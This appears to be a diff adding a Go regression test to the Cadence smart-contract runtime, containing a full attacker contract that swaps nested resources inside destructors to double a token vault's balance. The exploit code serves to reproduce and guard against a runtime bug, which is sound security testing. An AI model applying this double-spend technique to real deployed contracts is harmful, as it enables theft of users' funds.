@@ -8439,3 +8439,212 @@ func TestInvalidatedResourceUse(t *testing.T) {
 	require.ErrorAs(t, err, &destroyedResourceErr)
 
 }
+
+func TestInvalidatedResourceUse2(t *testing.T) {
+
+	t.Parallel()
+
+	runtime := newTestInterpreterRuntime()
+
+	signerAccount := common.MustBytesToAddress([]byte{0x1})
+
+	signers := []Address{signerAccount}
+
+	accountCodes := map[Location][]byte{}
+	var events []cadence.Event
+
+	runtimeInterface := &testRuntimeInterface{
+		getCode: func(location Location) (bytes []byte, err error) {
+			return accountCodes[location], nil
+		},
+		storage: newTestLedger(nil, nil),
+		getSigningAccounts: func() ([]Address, error) {
+			return signers, nil
+		},
+		resolveLocation: singleIdentifierLocationResolver(t),
+		getAccountContractCode: func(location common.AddressLocation) (code []byte, err error) {
+			return accountCodes[location], nil
+		},
+		updateAccountContractCode: func(location common.AddressLocation, code []byte) (err error) {
+			accountCodes[location] = code
+			return nil
+		},
+		emitEvent: func(event cadence.Event) error {
+			events = append(events, event)
+			return nil
+		},
+		log: func(s string) {
+			fmt.Println(s)
+		},
+	}
+
+	nextTransactionLocation := newTransactionLocationGenerator()
+
+	attacker := []byte(fmt.Sprintf(`
+        import VictimContract from %s
+
+        pub contract AttackerContract {
+
+            pub resource InnerResource {
+                pub var name: String
+                pub var parent: &OuterResource?
+                pub var vault: @VictimContract.Vault?
+
+                init(_ name: String) {
+                    self.name = name
+                    self.parent = nil
+                    self.vault <- nil
+                }
+
+                pub fun setParent(_ parent: &OuterResource) {
+                    self.parent = parent
+                }
+
+                pub fun setVault(_ vault: @VictimContract.Vault) {
+                    self.vault <-! vault
+                }
+
+                destroy() {
+                    self.parent!.shenanigans()
+                    var vault: @VictimContract.Vault <- self.vault!
+                    self.parent!.collect(<- vault)
+                }
+            }
+
+            pub resource OuterResource {
+                pub var inner1: @InnerResource
+                pub var inner2: @InnerResource
+                pub var collector: &VictimContract.Vault
+
+                init(_ victim: @VictimContract.Vault, _ collector: &VictimContract.Vault) {
+                    self.collector = collector
+                    var i1 <- create InnerResource("inner1")
+                    var i2 <- create InnerResource("inner2")
+                    self.inner1 <- i1
+                    self.inner2 <- i2
+                    self.inner1.setVault(<- victim)
+                    self.inner1.setParent(&self as &OuterResource)
+                    self.inner2.setParent(&self as &OuterResource)
+                }
+
+                pub fun shenanigans() {
+                    self.inner1 <-> self.inner2
+                }
+
+                pub fun collect(_ from: @VictimContract.Vault) {
+                    self.collector.deposit(from: <- from)
+                }
+
+                destroy() {
+                    destroy self.inner1
+                    // inner1 and inner2 got swapped during the above line
+                    destroy self.inner2
+                }
+            }
+
+            pub fun doubleBalanceOfVault(_ vault: @VictimContract.Vault): @VictimContract.Vault {
+                var collector <- vault.withdraw(amount: 0.0)
+                var outer <- create OuterResource(<- vault, &collector as &VictimContract.Vault)
+                destroy outer
+                return <- collector
+            }
+
+            pub fun attack() {
+                var v1 <- VictimContract.faucet()
+                log("Balance at the beginning: ".concat(v1.balance.toString()))
+                var v2 <- AttackerContract.doubleBalanceOfVault(<- v1)
+                log("Balance at the end: ".concat(v2.balance.toString()))
+                destroy v2
+           }
+        }`,
+		signerAccount.HexWithPrefix(),
+	))
+
+	victim := []byte(`
+        pub contract VictimContract {
+            pub resource Vault {
+
+                // Balance of a user's Vault
+                // we use unsigned fixed point numbers for balances
+                // because they can represent decimals and do not allow negative values
+                pub var balance: UFix64
+
+                init(balance: UFix64) {
+                    self.balance = balance
+                }
+
+                pub fun withdraw(amount: UFix64): @Vault {
+                    self.balance = self.balance - amount
+                    return <-create Vault(balance: amount)
+                }
+
+                pub fun deposit(from: @Vault) {
+                    self.balance = self.balance + from.balance
+                    destroy from
+                }
+            }
+
+            pub fun faucet(): @VictimContract.Vault {
+                return <- create VictimContract.Vault(balance: 5.0)
+            }
+        }
+    `)
+
+	// Deploy Victim
+
+	deployVictim := DeploymentTransaction("VictimContract", victim)
+	err := runtime.ExecuteTransaction(
+		Script{
+			Source: deployVictim,
+		},
+		Context{
+			Interface: runtimeInterface,
+			Location:  nextTransactionLocation(),
+		},
+	)
+	require.NoError(t, err)
+
+	// Deploy Attacker
+
+	deployAttacker := DeploymentTransaction("AttackerContract", attacker)
+
+	err = runtime.ExecuteTransaction(
+		Script{
+			Source: deployAttacker,
+		},
+		Context{
+			Interface: runtimeInterface,
+			Location:  nextTransactionLocation(),
+		},
+	)
+	require.NoError(t, err)
+
+	// Attack
+
+	attackTransaction := []byte(fmt.Sprintf(`
+        import VictimContract from %s
+        import AttackerContract from %s
+
+        transaction {
+            execute {
+                AttackerContract.attack()
+            }
+        }`,
+		signerAccount.HexWithPrefix(),
+		signerAccount.HexWithPrefix(),
+	))
+
+	signers = nil
+
+	err = runtime.ExecuteTransaction(
+		Script{
+			Source: attackTransaction,
+		},
+		Context{
+			Interface: runtimeInterface,
+			Location:  nextTransactionLocation(),
+		},
+	)
+
+	require.NoError(t, err)
+}
